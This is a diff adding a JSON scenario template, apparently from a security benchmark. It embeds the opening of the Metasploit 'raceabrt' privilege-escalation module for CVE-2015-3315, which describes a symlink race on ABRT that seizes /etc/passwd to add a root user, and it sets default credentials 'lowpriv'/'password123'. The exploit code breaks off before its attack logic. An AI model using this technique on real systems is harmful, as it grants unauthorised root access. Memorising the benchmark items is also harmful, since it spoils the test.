@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_44097",
+  "category": "C2_systemd",
+  "attack_technique": "T1543.002",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: ABRT - 'raceabrt' Privilege Escalation (Metasploit) (CVE-2015-3315)\n\nExploit source code (44097.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ABRT raceabrt Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Fedora systems with\n        a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured\n        as the crash handler.\n\n        A race condition allows local users to change ownership of arbitrary\n        files (CVE-2015-3315). This module uses a symlink attack on\n        '/var/tmp/abrt/*/maps' to change the ownership of /etc/passwd,\n        then adds a new user with UID=0 GID=0 to gain root privileges.\n        Winning the race could take a few minutes.\n\n        This module has been tested successfully on ABRT packaged version\n        2.1.5-1.fc19 on Fedora Desktop 19 x86_64, 2.2.1-1.fc19 on Fedora Desktop\n        19 x86_64 and 2.2.2-2.fc20 on Fedora Desktop 20 x86_64.\n\n        Fedora 21 and Red Hat 7 systems are reportedly affected, but untested.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Tavis Ormandy', # Discovery and C exploit\n          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit\n        ],\n      'DisclosureDate' => 'Apr 14 2015',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'References'     =>\n        [\n          [ 'CVE', '2015-3315' ],\n          [ 'EDB', '36747' ],\n          [ 'BID', '75117' ],\n          [ 'URL', 'https://gist.github.com/taviso/fe359006836d6cd1091e' ],\n          [ 'URL', 'http://www.openwall.com/lists/oss-security/2015/04/14/4' ],\n          [ 'URL', 'http://www.openwall.com/lists/oss-security/2015/04/16/12' ],\n          [ 'URL', 'https://github.com/abrt/abrt/commit/80408e9e24a1c10f85fd969e1853e0f192157f92' ],\n          [ 'URL', 'https://access.redhat.com/security/cve/cve-2015-1862' ],\n          [ 'URL', 'https://access.redhat.com/security/cve/cve-2015-3315' ],\n          [ 'URL', 'https://access.redhat.com/articles/1415483' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211223' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211835' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1218239' ]\n        ]\n    ))\n    register_options(\n      [\n        OptInt.new('TIMEOUT', [ true, 'Race timeout (seconds)', '900' ]),\n        OptString.new('USERNAME', [ false, 'Username of new UID=0 user (default: random)', '' ]),\n        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n      ])\n  end\n\n  def base_dir\n    datastore['WritableDir\n```",
+  "cve": "CVE-2015-3315",
+  "exploitdb_id": "44097",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_44097",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
